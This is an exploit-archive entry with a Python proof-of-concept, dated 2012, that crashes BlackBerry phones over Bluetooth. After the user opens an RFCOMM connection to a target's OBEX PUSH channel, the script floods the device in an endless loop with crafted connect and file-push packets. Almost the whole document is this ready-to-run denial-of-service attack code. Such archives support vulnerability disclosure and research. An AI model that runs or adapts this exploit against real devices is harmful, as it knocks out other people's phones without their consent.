@@ -1,0 +1,90 @@
+id: 19815
+date: 11/28/2012
+title: Blackberry OBEX PUSH Crash (Bluetooth) PoC
+author: Xianur0
+cves: 
+
+#!/usr/bin/python
+
+#Blackberry Bluetooth Crash (OBEX PUSH)
+# By Xianur0
+# xianur0.null@gmail.com
+# First you need to connect to RFCOMM device (rfcomm connect 0 <bluetooth mac address> [channel])
+# By default it uses the rfcomm0 but this number can be changed in the first argument of the command: rfcomm connect 0, rfcomm connect 1, etc...
+# ATTENTION: The channel of obex push can vary from blackberry to blackberry
+
+import binascii
+import serial
+
+filetosend="/home/xianur0/image.jpg"
+nametosend="crashingyou.jpg"
+
+def filenamed(string):
+	hexstring = "00"
+	for x in string:
+		hexstring += hex(ord(x))[2:]+"00"
+	return hexstring
+
+def bin2dec(hexstring):
+	hexval = ""
+	for a in hexstring:
+		aux = hex(ord(a))[2:]
+		if len(aux) < 2:
+			aux = "0"+aux
+		hexval += aux
+	return int(hexval, 16)
+
+def dec2hex(dec,largo):
+	retorno = hex(dec)[2:]
+	if (len(retorno)/2)*2 != len(retorno):
+		retorno = "0"+retorno
+	if(len(retorno)/2 < largo):
+		for i in range(largo-(len(retorno)/2)):
+			retorno = "00"+retorno
+	return retorno
+
+def enviar(filepath,filename):
+	serialrf = None
+	print "Loading..."
+	try:
+		serialrf = serial.Serial('/dev/rfcomm0',9600) # Change me if rfcomm is not 0
+	except:
+		return 1
+	print "Ok!"
+	filename = filenamed(filename)
+	filebinary = ""
+	filehandler = open(filepath,'rb')
+	for linea in filehandler.readlines():
+		filebinary += linea
+	lengthfile = len(filebinary)
+	print "File Size:",lengthfile
+	sizefragment = 38
+	while True:
+		try:
+			print "Sending bytes..."
+			serialrf.write(binascii.unhexlify("80000710001000")) # Inicializamos
+			print "Reading..."
+			status = serialrf.read(1)
+			print hex(ord(status))
+			if hex(ord(status)) == "0xa0" or hex(ord(status)) == "0x10":
+				resto = serialrf.read(2)
+				largo = bin2dec(resto)-3
+				if largo > 0:
+					resto = serialrf.read(largo)
+			else:
+				return 2
+			header = "01"+dec2hex((len(filename)/2)+4,2) + filename + "00c3" + dec2hex(len(filebinary),4)
+			lengthheader = (len(filename)/2)+12
+			fragmento = filebinary[0:sizefragment]
+			envio = binascii.unhexlify("02" + dec2hex(lengthheader+(sizefragment+3),2) + header + "48" + dec2hex(len(fragmento)+3,2))
+			envio += fragmento
+			serialrf.write(envio)
+		except:
+			return 4
+	serialrf.close()
+	return 0
+
+
+enviar(filetosend,nametosend)
+
+#  0day.today [2023-03-27]  #
